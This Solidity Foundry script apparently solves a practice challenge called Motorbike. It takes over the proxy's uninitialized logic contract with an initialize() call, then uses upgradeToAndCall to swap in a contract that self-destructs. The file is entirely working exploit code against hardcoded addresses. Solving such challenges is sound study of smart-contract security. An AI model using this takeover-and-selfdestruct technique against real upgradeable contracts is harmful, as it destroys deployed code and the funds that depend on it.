// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Motorbike.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract SelfDestructUpgrade {
    function destroy(address _to) external {
        selfdestruct(payable(_to));
    }
}

contract MotorbikeSolution is Script {
    Motorbike constant motorbikeInstance =
        Motorbike(0xE3004DA960bf1489782E340208cE78a0112A0EB4);

    Engine constant engineInstane =
        Engine(0xbF700D3E9565647352c5752a3c43b78bD94511A4);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        engineInstane.initialize();
        SelfDestructUpgrade selfDestructUpgrade = new SelfDestructUpgrade();
        bytes memory data = abi.encodeWithSelector(
            SelfDestructUpgrade.destroy.selector,
            vm.envUint("MY_ADDRESS")
        );
        engineInstane.upgradeToAndCall(address(selfDestructUpgrade), data);
        vm.stopBroadcast();
    }
}
